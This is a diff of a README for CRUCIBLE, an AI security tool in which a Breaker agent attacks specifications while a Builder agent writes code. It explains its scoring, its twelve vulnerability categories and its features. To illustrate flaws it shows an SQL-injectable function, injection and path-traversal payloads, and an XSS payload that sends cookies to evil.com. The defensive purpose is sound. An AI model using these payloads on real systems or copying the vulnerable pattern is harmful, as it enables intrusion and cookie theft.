@@ -31,45 +31,356 @@ Then your security team runs a penetration test and finds SQL injection in the l
 
 Or your compliance team receives a HIPAA audit notice. An AI-generated API endpoint is returning PHI in error messages. The code never had a human author who would have thought to apply output encoding. The AI followed the spec. The spec didn't mention output encoding. Nobody adversarially tested it.
 
-This is not a hypothetical. It is happening at companies across every regulated industry — finance, healthcare, government, insurance — right now.
+Or a FINRA examination flags an AML detection gap in a fraud scoring engine. The code is correct by every unit test. But an attacker who understands the spec can craft transactions that slip beneath the detection threshold — and the code, following the spec faithfully, lets them through.
 
-The gap between *AI-generated code* and *adversarially-resilient AI-generated code* has no existing solution. Static analyzers (Bandit, Semgrep) find yesterday's patterns. Penetration tests happen after deployment. Code review catches what reviewers know to look for. None of them close the gap at generation time.
+This is not hypothetical. It is happening across every regulated industry — finance, healthcare, government, insurance — right now, at scale.
 
-**CRUCIBLE closes it.**
+**The root cause is a distinction almost no one in the industry has named clearly.**
 
 ---
 
-## The Core Insight
+## What Does "Adversarially Resilient AI-Generated Code" Actually Mean?
 
-Every AI coding tool today follows the same pattern:
+This is the question at the heart of CRUCIBLE. It is worth spending time here, because if you understand this distinction, everything else follows.
 
+### Functional correctness vs. adversarial resilience
+
+When we say code is **functionally correct**, we mean: it does what the spec says.
+
+The spec says "authenticate users." The AI generates an authentication function. Tests pass. PR merges. ✓
+
+When we say code is **adversarially resilient**, we mean something fundamentally different: the code holds up when a motivated, intelligent attacker deliberately tries to make it misbehave — including attacks that the spec never mentioned, attacks that no unit test covers, attacks that only emerge when you ask "what does this code look like from the other side of the trust boundary?"
+
+A single endpoint can be **functionally correct and adversarially empty at the same time**:
+
+```python
+# Spec: "Accept a username and return the user's profile"
+# Generated code: functionally correct — it returns the profile
+
+def get_profile(username):
+    query = f"SELECT * FROM users WHERE name = '{username}'"  # CWE-89
+    result = db.execute(query)
+    return result.fetchone()
 ```
-Spec  →  AI generates code  →  Tests run  →  Ship
-```
 
-The testing is sequential. It happens after generation. Security is an afterthought, bolted on at the end.
+This code does exactly what the spec says. Every functional test passes. But an attacker who sends `username = "' OR '1'='1"` now owns your entire users table. The spec said nothing about SQL injection. The AI had no reason to know it should parameterize the query. The unit tests had no reason to send adversarial input.
 
-CRUCIBLE does something fundamentally different:
+**This is the gap CRUCIBLE is designed to close.**
 
-```
-Spec  ──►  Builder generates code  ─────────────────────────────►  Code
-      │
-      └──►  Breaker generates attacks  ──►  Arbiter scores  ──►  ARS: 0.87
-```
+### The three properties of adversarial resilience
 
-The **Builder** and **Breaker** run **concurrently** via `asyncio.gather()`. They start at the same instant, against the same specification. By the time the Builder is done, you already have a full adversarial report — not a post-hoc analysis, but a co-generated security measurement.
+Adversarial resilience in AI-generated code has three distinct properties that must all hold simultaneously:
 
-The **Adversarial Resilience Score (ARS)** is the number that captures what this means:
+**1. Completeness of defense** — the code defends against the *full threat model implied by its business context*, not just the attacks the developer happened to think of while writing it. A healthcare API implies PHI protection even if the spec says nothing about HIPAA. A financial transaction endpoint implies AML even if the spec just says "process payment."
+
+**2. Correctness of defense** — having a defense is not enough if it is bypassable. Input validation that checks for `<script>` but not `<Script>` or `&#60;script&#62;` is a partial defense. SQL filtering that strips `DROP TABLE` but doesn't use parameterized queries is a partial defense. CRUCIBLE scores partial defenses at 0.5, not 1.0 — because a partial defense gives false confidence.
+
+**3. Depth of defense** — security controls must be applied at the right layers. Input validation at the controller layer can be bypassed if the same value flows unchecked into a different code path. The Breaker probes for defense-in-depth failures: does every path from untrusted input to sensitive operation have a checkpoint?
+
+### Why AI models have a structural weakness here
+
+AI code generation models are trained to minimize the distance between *what the spec says* and *what the code does*. That is exactly the right objective for functional correctness. It is exactly the wrong objective for adversarial resilience.
+
+Security invariants that every experienced engineer knows are **implicit, unstated, and domain-specific**:
+
+- "Every string that touches a database must be parameterized" — not in your spec
+- "Every user-controlled value rendered in HTML must be encoded" — not in your spec  
+- "Every file path from user input must be canonicalized and validated against an allowlist" — not in your spec
+- "Every deserialized object from an untrusted source must be type-checked before use" — not in your spec
+- "Every AML transaction score must be signed so the score cannot be tampered with in transit" — not in your spec
+
+The AI faithfully implements what is written. It has no ambient threat model. It does not know that your "accept username" endpoint will one day be called by an attacker with a SQL injection payload, not just your test suite with clean strings.
+
+---
+
+## The Twelve Levers of Resilience CRUCIBLE Tests
+
+CRUCIBLE's Breaker probes generated code against twelve categories of adversarial attack, selected and weighted by the language and business domain detected from the specification.
+
+### 1. Injection Resistance (CWE-89, CWE-78, CWE-94, CWE-1343)
+
+Does the generated code safely handle user-controlled data that flows into interpreters — SQL, OS shell, eval(), LDAP, XPath, template engines?
+
+*What the Breaker checks from the spec:* Every place the spec implies an input that might flow into a storage or execution layer. The Breaker generates payloads like `'; DROP TABLE users; --`, `$(cat /etc/passwd)`, `{{7*7}}` (template injection) and evaluates whether the generated code would pass them through undefended.
+
+### 2. Output Encoding (CWE-79, CWE-116)
+
+Does the generated code encode data in the correct context before outputting it — HTML encoding for HTML contexts, URL encoding for URLs, JSON escaping for JSON responses?
+
+*What the Breaker checks from the spec:* Every place the spec implies a user-controlled value is echoed back — error messages, search results, display names, filenames shown to the user. Reflected XSS is the canonical miss here: the spec says "show the error message," the AI shows it, and user-controlled content in the error is now executable in the victim's browser.
+
+### 3. Authentication Integrity (CWE-287, CWE-384, CWE-798)
+
+Does the generated code implement authentication mechanisms correctly — no hardcoded credentials, no predictable tokens, no session fixation, no credential exposure in logs or error messages?
+
+*What the Breaker checks from the spec:* Every authentication flow implied by the spec. Does the spec say "API key"? The Breaker checks whether the generated code exposes the key in logs. Does the spec say "session token"? The Breaker checks for fixation and replay vulnerabilities.
+
+### 4. Authorization Correctness (CWE-285, CWE-862, CWE-863, CWE-639)
+
+Does the generated code check not just "is this user authenticated?" but "is this specific user authorized to access this specific resource?"
+
+*What the Breaker checks from the spec:* Object-level access control — BOLA (Broken Object Level Authorization) is the most commonly missed pattern in AI-generated code. The spec says "return the user's orders" and the AI generates `GET /orders/{id}` with no check that the authenticated user owns order `{id}`. An attacker increments the ID. Every other user's orders are exposed.
+
+### 5. Deserialization Safety (CWE-502)
+
+Does the generated code safely handle serialized data — pickle, YAML with `yaml.load()`, Java object deserialization, XML with entity expansion — from untrusted sources?
+
+*What the Breaker checks from the spec:* Every place the spec implies data is accepted from an external source and processed. `yaml.load()` in Python executes arbitrary Python when given a crafted document. The AI generates it because it is the natural way to parse YAML. The Breaker probes whether the generated code uses `yaml.safe_load()` instead.
+
+### 6. Path Traversal and File System Safety (CWE-22, CWE-73)
+
+Does the generated code prevent directory traversal attacks — `../../etc/passwd` — when handling user-controlled file paths?
+
+*What the Breaker checks from the spec:* Every place the spec implies file system access based on user input — file uploads, file downloads, log viewers, configuration readers. The Breaker generates traversal payloads and checks whether the generated code validates and canonicalizes paths before use.
+
+### 7. Cryptographic Correctness (CWE-327, CWE-321, CWE-330, CWE-311)
+
+Does the generated code use strong cryptographic algorithms, generate properly random values, store credentials with appropriate hashing, and avoid hardcoded secrets?
+
+*What the Breaker checks from the spec:* Every place the spec implies data must be protected — password storage, token generation, data at rest encryption. `MD5` for password hashing, `random()` instead of `secrets.token_bytes()` for security tokens, symmetric keys embedded in source — all CWEs the AI generates naturally unless specifically told not to.
+
+### 8. Race Condition and Concurrency Safety (CWE-362, CWE-367)
+
+Does the generated code protect shared state against time-of-check/time-of-use (TOCTOU) races and concurrent modification?
+
+*What the Breaker checks from the spec:* Every place the spec implies a check followed by an action that must be atomic — "check if user has credits, then deduct credits"; "check if file exists, then open it." Race conditions are especially common in AI-generated async Python, Go goroutines, and JavaScript Promise chains.
+
+### 9. Prototype Pollution (CWE-1321 — JavaScript/TypeScript only)
+
+Can an attacker inject properties into `Object.prototype` through user-controlled input to `merge()`, `extend()`, `clone()` or similar functions?
+
+*What the Breaker checks from the spec:* Every JavaScript/TypeScript endpoint that accepts nested JSON objects or uses deep merge/copy utilities. Prototype pollution is a JavaScript-specific vulnerability class that AI generates frequently because the patterns that cause it (`Object.assign`, `_.merge`, recursive spread) are the idiomatic way to merge configuration or user objects.
+
+### 10. Server-Side Request Forgery (CWE-918)
+
+Can an attacker cause the generated code to make outbound requests to internal network resources — metadata services, internal APIs, cloud provider endpoints?
+
+*What the Breaker checks from the spec:* Every place the spec implies an outbound HTTP request based on user-controlled input — webhook handlers, URL preview features, import-from-URL functionality, proxy endpoints.
+
+### 11. Resource Exhaustion and DoS (CWE-770, CWE-674, CWE-407)
+
+Does the generated code protect against resource exhaustion — unbounded loops, infinite recursion, memory allocation based on user-controlled size, algorithmic complexity attacks (ReDoS)?
+
+*What the Breaker checks from the spec:* Every place the spec implies processing of user-controlled data size or structure — file parsing, regex matching against user input, recursive data structure traversal.
+
+### 12. Sensitive Data Exposure (CWE-200, CWE-532, CWE-359)
+
+Does the generated code avoid leaking sensitive data in error messages, logs, API responses, or HTTP headers?
+
+*What the Breaker checks from the spec:* Every error path the spec implies. AI models consistently generate helpful error messages — "User 'alice' not found," "Invalid password for user 'alice'," "Account 'alice' locked" — that expose user existence, enumeration surface, or application internals to an attacker.
+
+---
+
+## Why the Spec Is the Right Attack Surface — Not the Code
+
+This is the architectural choice that makes CRUCIBLE different from every static analyzer.
+
+Static analysis (Bandit, Semgrep, CodeQL) reads the **generated code** and pattern-matches against known bad patterns. It asks: "Does this code contain `eval()`?" or "Does this function call `yaml.load()`?" This is valuable — but it has a fundamental ceiling. It only finds what it was programmed to look for. It finds known-bad patterns in written code.
+
+CRUCIBLE's Breaker reads the **specification**. It asks: "Given what this code is *supposed to do*, what would a motivated attacker *try to do with it*?" This is a different question entirely — and it is the question that matters for security.
+
+The spec is the right surface because:
+
+**1. The spec defines the trust boundary.** The spec says "accept user input." That phrase — "user input" — is the trust boundary declaration. Everything the spec says comes from users is potentially adversarial. The Breaker reasons from that boundary.
+
+**2. The spec implies the business domain.** "HIPAA patient portal" implies PHI protection even if the spec never says "protect PHI." "Financial transaction endpoint" implies AML constraints even if the spec never mentions FINRA. The Breaker's language profiles and domain policies encode this implicit knowledge.
+
+**3. The spec survives implementation changes.** If you refactor the generated code, static analysis has to re-scan. CRUCIBLE's attacks against the spec remain valid because they test the *intent*, not the implementation. A vulnerability in the intent survives a refactor.
+
+**4. The spec is where AI hallucination risk concentrates.** The AI interprets the spec, makes assumptions about unstated invariants, and generates code based on those assumptions. The Breaker tests those exact assumptions — the points where the AI had to infer something the spec didn't state.
+
+---
+
+## Why Devin, Copilot, SWE-Agent, and OpenHands Don't Do This — And Structurally Cannot
+
+This is the question every engineering leader asks. The answer is not that other tools are behind — it is that **they are solving a different problem with a different optimization target.**
+
+**Copilot** (and all inline code completion tools) optimize for *developer velocity*: complete the current line of code as fast as possible in the context of what the developer is already writing. The security signal available to an inline autocomplete model is zero — it does not know what the finished function will do, what data it will receive, or what trust boundary it crosses.
+
+**Devin, SWE-agent, OpenHands** optimize for *task completion*: given a GitHub issue or a bug report, produce a PR that fixes it. Their success metric is "does the code pass the tests?" or "does the PR get merged?" Neither metric has any adversarial component. When Devin generates a fix, it has no mechanism to ask "what would an attacker do with this fix?" — it has a spec (the issue), it has a codebase, it has tests, and it generates code that satisfies all three. Adversarial resilience is not in the success function.
+
+**Why they *can't* add it without fundamental architectural change:**
+
+Adding concurrent adversarial testing to a sequential code generation tool is not an additive feature. It requires:
+
+1. A **second agent** (the Breaker) that runs *concurrently* with the Builder and reasons from the specification, not from the generated code
+2. An **Arbiter** that scores each attack against the generated code in a domain-aware way
+3. A **persistent adversarial memory** (Knowledge Forge) that carries forward what was learned about this codebase's attack surface across every future run
+4. A **gate mechanism** that can block CI/CD pipelines based on the adversarial score
+5. **Compliance artifact generation** that maps attacks to regulatory control frameworks
+
+None of these are features you add to a sequential code generator. They require the adversarial loop to be the architectural primitive — which is exactly what CRUCIBLE was designed as from the ground up.
+
+**The economic incentive gap:** Tools like Devin and Copilot are measured by developer adoption — developers choose them when they make coding faster. Security outcomes are not in the adoption metric. CRUCIBLE is measured by a different success function entirely: how many adversarial attacks does the generated code correctly defend against? This is the right metric for regulated industries, but it requires accepting that some PRs will be blocked — which is the opposite of what developer-velocity tools optimize for.
+
+---
+
+## The Adversarial Resilience Score (ARS): A Formal Definition
+
+The ARS is CRUCIBLE's answer to the question: "How resilient is this AI-generated code to a motivated attacker who understands its specification?"
 
 ```
 ARS = Σ(attack_scores) / N
 
-  1.0  →  mitigated  (the code has a correct defense)
-  0.5  →  partial    (some defense, but bypassable)
-  0.0  →  missed     (no defense; an attacker would succeed)
+where:
+  N            = number of attacks fired (5 for quick, 20 for standard, 50 for thorough)
+  attack_score = 1.0  if the generated code correctly mitigates the attack
+               = 0.5  if a partial defense exists but is bypassable or incomplete
+               = 0.0  if no defense exists — an attacker would succeed
+
+ARS range: [0.0, 1.0]
+  1.0  =  perfect adversarial resilience for all attacks fired
+  0.87 =  4 of 5 attacks mitigated, 1 missed (typical first-run score)
+  0.50 =  half the attacks succeed — security-critical code, do not ship
+  0.0  =  no defenses detected — generative output with no security consideration
 ```
 
-ARS < 0.80 with `fail_open: false` means the PR cannot merge. Not a warning. Not an advisory. A hard cryptographic gate.
+**ARS is not a test pass rate.** A test pass rate measures whether the code does what it should. ARS measures whether the code holds up against what it should *not* allow. The two can be completely independent: code can be 100% test-passing and 0.0 ARS simultaneously (functionally correct, adversarially empty).
+
+**ARS is tamper-evident.** Every report carries a SHA-256 hash over the ordered attack array. `crucible verify <run_id>` re-derives this hash at any future point — the score cannot be altered post-generation without detection. This is what makes ARS usable as a compliance artifact.
+
+**ARS is a gate, not a suggestion.** With `fail_open: false` in `.crucible.yml`, ARS below `minimum_ars` causes `crucible run` to exit with code 1 — blocking the CI pipeline, preventing the PR merge. Not an advisory. A hard, cryptographic, audit-traceable gate.
+
+**ARS trends over time reveal the learning effect.** Because the Knowledge Forge carries forward every scored attack across builds, the Breaker gets more effective with each run — more targeted to the specific vulnerability patterns your codebase generates. ARS scores for a given spec type typically improve monotonically over 5-10 runs as the Forge learns what attacks your builders actually need to defend against.
+
+---
+
+## The Core Insight — Concurrency as the Execution Primitive
+
+Every AI coding tool today follows the same sequential pattern:
+
+```
+Spec  →  AI generates code  →  Tests run  →  [maybe] Security scan  →  Ship
+                                                           ↑
+                                              afterthought, post-hoc, too late
+```
+
+CRUCIBLE's architecture inverts this:
+
+```
+                    ┌─────────────────────────────────────────────────┐
+                    │              asyncio.gather()                     │
+                    │                                                   │
+Spec ──────────────►│  Builder ──────────────────────────────► Code    │
+          │         │                                                   │
+          └────────►│  Breaker ──► [CWE attacks] ──► Arbiter ──► ARS  │
+                    │                                                   │
+                    └─────────────────────────────────────────────────┘
+                              Both start at t=0. Both finish together.
+```
+
+The **Builder** and **Breaker** start at the same instant, run concurrently, and both read the same specification. The Breaker does not wait for code to exist — it reasons adversarially from the specification, the same source of truth the Builder uses to generate the implementation.
+
+By the time the Builder finishes, you do not just have code. You have code *and* an adversarial score *and* a full Resilience Report *and* SARIF for GitHub Code Scanning *and* a Forge Ledger entry for every attack. The security measurement is not an afterthought. It co-exists with the generation.
+
+ARS < 0.80 with `fail_open: false` means the PR cannot merge. Not a warning. Not an advisory. A hard, cryptographic gate.
+
+---
+
+## 💡 Why Concurrent Matters — The Value You Are Actually Getting
+
+> *"You could test security after the build. So why does it matter that CRUCIBLE attacks at the same time as generation?"*
+
+This is the right question, and the answer is **not about speed**. Concurrent execution provides value that sequential execution cannot provide, regardless of how fast the sequential approach is.
+
+### The difference is not time — it is the attack surface
+
+When you run a security scanner **after** code is built, you are attacking the **implementation** — what the AI decided to do.
+
+When CRUCIBLE's Breaker runs concurrently from the **specification**, it attacks the **intent** — what the system was supposed to do. These are different things, and attackers attack intent, not implementation.
+
+An attacker who reads your GitHub issue or product spec does not care how your ORM formats queries. They care about: *can I make this system do something it was not supposed to do?* The gap between "what was intended" and "what was defended" is exactly where vulnerabilities live.
+
+By attacking from the spec, CRUCIBLE tests the same surface attackers test. Post-build scanners test the surface developers created.
+
+### The anchoring problem that sequential testing cannot escape
+
+When a human security reviewer sees code first, they unconsciously anchor to: *"What does this code do?"* This is anchoring bias — the brain's natural tendency to interpret new information in the context of what it already knows.
+
+A post-build scanner has the same structural problem: it sees the code as-is and evaluates whether it contains known bad patterns. It has been anchored to the implementation.
+
+CRUCIBLE's Breaker **never sees the generated code**. It reasons purely from the specification, in an adversarial frame, without any anchor to the implementation choices the Builder made. It asks: *"What would an attacker do with this system as described?"* — not *"Is this code I'm looking at secure?"*
+
+This is a fundamentally different cognitive frame, and it consistently surfaces attacks that implementation-anchored review misses.
+
+### The commitment trap — why post-build security review fails in practice
+
+By the time a security review runs on generated code, several things have already happened:
+
+1. The AI generated the implementation (encoding all its implicit assumptions into the code)
+2. A developer read, understood, and approved the PR
+3. The code reviewer mentally classified the code as "working" and "correct"
+4. The CI pipeline ran and passed
+5. The team has emotionally moved on to the next task
+
+Now you find a critical vulnerability. What happens?
+
+- A new PR must be opened
+- The original PR must be reverted or hot-patched
+- The developer must re-context-switch back to code they "finished" days ago
+- A new review cycle is required
+- Timeline pressure builds because the feature was "already done"
+
+The result — in practice, across real engineering teams — is that security findings from post-build review are **negotiated, deferred, or closed as "acceptable risk"** at a rate that findings from pre-commit testing simply are not. Not because engineers are negligent, but because the sunk cost of already-written code creates enormous pressure to ship it.
+
+CRUCIBLE catches findings before the first commit is made. The code does not yet have a commit hash. There is no PR to close. There is no sunk cost to overcome. The finding is a diff, not a regression.
+
+### The "same timestamp" proof — concurrency creates a causal chain
+
+Here is a specific property that concurrent execution creates and sequential execution cannot replicate: **causal linkage between generation and attack surface**.
+
+When the Builder and Breaker run against the same spec at the same timestamp, with the same run ID, every attack in the Forge Ledger is causally linked to a specific generation event. The ARS is not a score *of the code* — it is a score *of the spec-to-code translation* at that specific moment.
+
+This matters for two reasons:
+
+**Audit:** A compliance team can produce a run ID and say: "When we generated this code on this date, it achieved ARS 0.92 against 20 adversarial attacks, verified by SHA-256 hash `a7f3b2c9...`." That is a tamper-evident, timestamped, generation-time security artifact. No post-build scanner can produce a score that is causally linked to the act of generation — because by the time they run, the code already exists independently of the generation event.
+
+**Learning:** Because each attack was scored against a specific spec + fingerprint combination, the Knowledge Forge can recall *which attack patterns are semantically similar to the ones your type of spec generates*. Post-build scanners learn from CVE databases — generic patterns across all codebases. CRUCIBLE learns from your specific spec patterns — highly targeted recall for your codebase's actual generation style.
+
+### The NIST cost curve — why the moment of attack matters
+
+NIST studies on security bug remediation costs put the numbers at:
+
+| Phase detected | Avg remediation cost |
+|---------------|---------------------|
+| Design / spec | $60 |
+| Implementation | $500 |
+| Code review | $2,000 |
+| QA / test | $5,000 |
+| Production | $30,000 – $300,000 |
+
+Traditional security testing operates at **code review** or **QA** phases. CRUCIBLE operates at the **design/implementation boundary** — simultaneously. The cost difference is not a multiplier. It is an order of magnitude.
+
+Across an engineering team shipping 50 AI-generated features per quarter, the economic case is straightforward:
+
+```
+50 features × 2 security findings each = 100 findings per quarter
+
+Detected at code review  ($2,000 ea):  $200,000/quarter in remediation
+Detected at production   ($30,000 ea): $3,000,000/quarter in remediation
+Detected by CRUCIBLE pre-commit ($60 ea): $6,000/quarter in remediation
+```
+
+### What concurrent execution is NOT
+
+To be clear about what CRUCIBLE does and does not claim:
+
+- **Not a replacement for penetration testing.** Pentesting by human experts with full system access will always discover attacks that CRUCIBLE misses. CRUCIBLE is not a pentest.
+- **Not a SAST/DAST replacement.** Static and dynamic analysis tools that scan the full codebase have different — often complementary — coverage. CRUCIBLE does not scan your existing codebase; it adversarially tests each spec-to-code generation event.
+- **Not faster security testing.** CRUCIBLE is not a faster version of existing security testing. It is a different operation — adversarial specification review — that operates at a different point in the pipeline.
+
+CRUCIBLE's claim is specific: **for AI-generated code, the moment of generation is the right moment to test adversarial resilience, because that is when the trust assumptions are being encoded.** Once the code is committed, those assumptions are structural. Correcting them is expensive. Preventing them is not.
+
+### Summary — the six structural advantages of concurrent adversarial testing
+
+| Property | Post-Build Security Testing | CRUCIBLE Concurrent Testing |
+|----------|---------------------------|---------------------------|
+| **Attack surface** | Implementation (code as-is) | Specification (intent, same surface as real attackers) |
+| **Anchoring bias** | Scanner / reviewer anchored to code | Breaker never sees code — pure adversarial reasoning |
+| **Timing** | After commit, after review, after PR | Before first commit exists |
+| **Causal linkage** | Score of code (post-hoc) | Score of generation event (causal, tamper-evident) |
+| **Learning** | Generic CVE patterns | Forge recalls patterns specific to your spec type |
+| **Economic moment** | Code review / QA phase ($2K–$5K/finding) | Design/implementation boundary ($60/finding) |
 
 ---
 
@@ -145,25 +456,610 @@ CRUCIBLE pulls the issue body as the specification, fingerprints the target lang
 
 ---
 
-## ✨ Feature Highlights
+## 🔬 Features In Depth
 
-- **Concurrent generation + attack** — `asyncio.gather()` is the core primitive; Breaker does not wait for Builder
-- **Adversarial Resilience Score (ARS)** — a tamper-evident 0–1 score, SHA-256 integrity hash, auditable by `crucible verify`
-- **Knowledge Forge** — ChromaDB-backed cross-build adversarial memory; Breaker gets smarter with every run
-- **Forge Ledger** — human-readable Markdown vault at `.crucible/vault/CWE-XXX/`; readable without any tooling
-- **Language Profiles** — per-language CWE priority lists for JavaScript, TypeScript, Python, Java, Go; auto-detected
-- **BreakContext compression** — ~40% token reduction on Breaker inputs; Arbiter boundary never compressed
-- **Policy domains** — OWASP, HIPAA, FINRA, PCI-DSS, SOC 2, NIST SSDF; installed via `crucible policy install`
-- **Policy Hub** — community-contributed regulatory playbooks installable without source modification
-- **SARIF 2.1.0** — GitHub Code Scanning integration out of the box
-- **JUnit XML + HTML** — CI dashboard and downloadable evidence reports
-- **Slack + Jira alerts** — automatic notifications on low-ARS runs
-- **Domain Intelligence Adapter** — MCP consumer; enriches Breaker with live threat intelligence feeds
-- **Combat Dashboard** — FastAPI web UI; ARS sparkline chart, evidence download, Forge stats
-- **Enterprise RBAC** — GitHub team-based roles (Admin / Reviewer / Developer); 5-minute TTL cache
-- **ARS Leaderboard** — benchmark AI coding agents side-by-side; GitHub Pages ready
-- **Forge Network** — opt-in community pattern sharing; anonymous, no code transmitted
-- **Air-gap / on-premises** — full engine works offline with Ollama; no telemetry
+Every feature in CRUCIBLE exists to close a specific gap in how AI-generated code is understood, measured, and defended. This section walks through each one — not just what it does, but *why it exists* and what it looks like when you use it.
+
+---
+
+### Feature 1 — The CombatPair Engine
+
+**The problem it solves:** Sequential security testing is fundamentally reactive. By the time you run a scanner on generated code, the code is already written, often already reviewed, sometimes already merged. Fixing a security issue at that stage costs 10–100× more than preventing it at generation time.
+
+**What it does:** The CombatPair runs two agents concurrently against the same specification using Python's `asyncio.gather()`. The Builder produces an implementation. The Breaker simultaneously produces adversarial attacks against the spec's implicit threat model. When both finish, the Arbiter scores every attack and produces the ARS.
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│  CombatPair — asyncio.gather() execution                                 │
+│                                                                           │
+│  t=0  ──────────────────────────────────────────────────────────► t=43s  │
+│         │                                                           │      │
+│  SPEC ──┤── Builder: read spec → implement → write code ───────────┤      │
+│         │                                                           │      │
+│         └── Breaker: read spec → reason about attacks → fire ──────┤      │
+│              ├─ t=5s:  CWE-89  SQL injection via username           │      │
+│              ├─ t=12s: CWE-502 unsafe deserialization               │      │
+│              ├─ t=19s: CWE-78  OS command injection in path         │      │
+│              ├─ t=28s: CWE-22  path traversal in upload             │      │
+│              └─ t=35s: CWE-79  reflected XSS in error message       │      │
+│                                                                     ▼      │
+│                                               Arbiter scores ──► ARS: 0.87 │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+**Three attack modes:**
+
+| Mode | Attacks | Typical time (local) | Typical cost (API) | Use case |
+|------|---------|---------------------|--------------------|---------|
+| `quick` | 5 | 40–90s | ~$0.08 | Every PR, fast feedback loop |
+| `standard` | 20 | 3–5 min | ~$0.30 | Pre-merge gate, standard CI |
+| `thorough` | 50 | 8–12 min | ~$0.75 | Release branches, compliance audits |
+
+```bash
+crucible run --issue spec.md --mode standard --pretty
+```
+
+---
+
+### Feature 2 — The Knowledge Forge
+
+**The problem it solves:** Every time a new AI coding tool runs, it starts cold. It knows nothing about what attacks worked against similar code last week. It will generate the same attacks it always generates, miss the same things it always misses, and provide no compound value over time.
+
+**What it does:** After every run, CRUCIBLE writes every scored attack into the **Knowledge Forge** — a [ChromaDB](https://www.trychroma.com/) vector database embedded in `.crucible/forge/`. On the next run, the Breaker recalls the most semantically similar past attacks for this codebase fingerprint (language, surface signals, domain), incorporates their descriptions into its reasoning context, and starts from a higher adversarial baseline.
+
+The result is a **learning curve**: the Breaker gets progressively more effective against your specific codebase patterns. It does not re-discover attacks it already discovered. It builds on them.
+
+```
+$ crucible stats --days 30 --learning-curve
+
+  Knowledge Forge — Learning Curve (last 30 days)
+  ─────────────────────────────────────────────────
+  Run  1  (2026-05-29):  Forge recall:  0 attacks  ARS: 0.74  ▓░░░░░░░░░░
+  Run  3  (2026-06-04):  Forge recall:  5 attacks  ARS: 0.80  ▓▓▓░░░░░░░░
+  Run  6  (2026-06-11):  Forge recall: 12 attacks  ARS: 0.85  ▓▓▓▓▓░░░░░░
+  Run 10  (2026-06-18):  Forge recall: 18 attacks  ARS: 0.89  ▓▓▓▓▓▓▓░░░░
+  Run 14  (2026-06-25):  Forge recall: 22 attacks  ARS: 0.92  ▓▓▓▓▓▓▓▓▓░░
+  Run 18  (2026-06-28):  Forge recall: 25 attacks  ARS: 0.94  ▓▓▓▓▓▓▓▓▓▓░
+
+  Forge cache: 47 attacks stored  |  Similarity threshold: 0.75
+  Top recalled CWEs: CWE-89 (12×), CWE-79 (8×), CWE-502 (6×), CWE-78 (5×)
+```
+
+The Forge is local by default — fully air-gapped, no data leaves your environment. If you opt into the Forge Network (see below), anonymized attack vectors can be shared with the community and you receive community-discovered patterns in return.
+
+```bash
+crucible stats --learning-curve   # visualize the compound improvement
+crucible stats --by-cwe           # ARS breakdown by vulnerability category
+crucible stats --days 90          # 90-day trend
+```
+
+---
+
+### Feature 3 — The Forge Ledger
+
+**The problem it solves:** ChromaDB is a vector database — powerful for similarity search, but opaque to human readers. Security engineers, auditors, and compliance teams need to read individual attack records without database tooling. They need something they can open in a text editor, commit to a repository, diff in a PR, and attach to a compliance ticket.
+
+**What it does:** The **Forge Ledger** is a human-readable Markdown vault that lives alongside the Knowledge Forge. Every attack from every run is written as an individual Markdown file with YAML frontmatter at `.crucible/vault/<CWE-XXX>/<slug>.md`.
+
+```
+.crucible/
+└── vault/
+    ├── CWE-89/
+    │   ├── a3f9-atk-001-sql-injection-username.md
+    │   └── b7d2-atk-003-sqli-order-by-clause.md
+    ├── CWE-79/
+    │   └── a3f9-atk-005-xss-reflected-error-msg.md
+    ├── CWE-502/
+    │   └── c1e8-atk-002-pickle-deserialization.md
+    └── CWE-22/
+        └── a3f9-atk-004-path-traversal-upload.md
+```
+
+Each entry looks like this:
+
+```markdown
+---
+cwe: CWE-79
+attack_id: atk-005
+severity: high
+effectiveness: 0.0
+verdict: missed
+run_id: crucible-2026-06-28T12-00-00Z-a3f9
+fingerprint: python-async-filesystem
+recorded_at: 2026-06-28T12:01:43Z
+---
+
+## Attack: Reflected XSS in error response
+
+The specification requires displaying an error message when authentication fails.
+The generated code echoes the user-supplied username in the 401 response body
+without applying HTML output encoding.
+
+An attacker who sends `username=<script>document.location='https://evil.com/?c='+document.cookie</script>`
+will have that payload reflected verbatim into the response body. A victim who
+follows a crafted link will have their session cookie exfiltrated.
+
+**Suggested fix:** Apply `html.escape()` to all user-controlled strings before
+interpolating into HTML contexts. Use a templating engine with auto-escaping enabled.
+```
+
+Browse the vault from the CLI:
+
+```bash
+$ crucible vault --stats
+
+  Forge Ledger — Vault Statistics
+  ─────────────────────────────────────────────────────────────
+  Total entries:   47 attacks across 18 runs
+  CWE breakdown:
+    CWE-89  SQL Injection          ████████████  12 entries  avg effectiveness: 0.0
+    CWE-79  XSS                    ████████       8 entries  avg effectiveness: 0.1
+    CWE-502 Deserialization        ██████         6 entries  avg effectiveness: 0.2
+    CWE-78  OS Command Injection   █████          5 entries  avg effectiveness: 0.0
+    CWE-22  Path Traversal         ████           4 entries  avg effectiveness: 0.0
+    other                          ████████████  12 entries
+  Severity: high: 28  medium: 15  low: 4
+  ─────────────────────────────────────────────────────────────
+
+$ crucible vault --cwe CWE-89 --format md    # Markdown table of all SQL injection entries
+$ crucible vault --cwe CWE-79               # filter to XSS entries only
+```
+
+---
+
+### Feature 4 — Language Profiles and Spec Fingerprinting
+
+**The problem it solves:** A generic "run all attacks" approach wastes rounds on CWEs that don't apply to the target language or framework — prototype pollution against a Java service, or nil pointer dereference against a Python REST API. With only 5–50 attacks per run, every attack must be targeted.
+
+**What it does:** When you run `crucible run`, the first thing CRUCIBLE does is **fingerprint the specification** — detecting the target language and surface signals from the spec text, without ever looking at generated code.
+
+```
+$ crucible run --issue spec.md --mode standard --pretty
+
+  [fingerprint]  language:      python
+  [fingerprint]  signals:       async, filesystem, user-auth, api-boundary
+  [fingerprint]  framework:     detected: FastAPI patterns
+  [fingerprint]  profile:       python → [CWE-89, CWE-78, CWE-502, CWE-22, CWE-94, CWE-611, CWE-918, CWE-330]
+  [fingerprint]  context:       "Python async API — prioritize injection, deserialization, SSRF"
+```
+
+Detection runs in priority order to avoid misclassification: TypeScript → JavaScript → Java → Go → Python. Each language has its own CWE priority list and attack context string passed to the Breaker:
+
+| Language | Priority CWEs | Key attack context |
+|----------|-------------|-------------------|
+| **JavaScript** | CWE-1321, CWE-79, CWE-94, CWE-352, CWE-601, CWE-918, CWE-362, CWE-346 | Prototype pollution, eval injection, CORS |
+| **TypeScript** | JS CWEs + CWE-285 | Typed but still runtime-vulnerable |
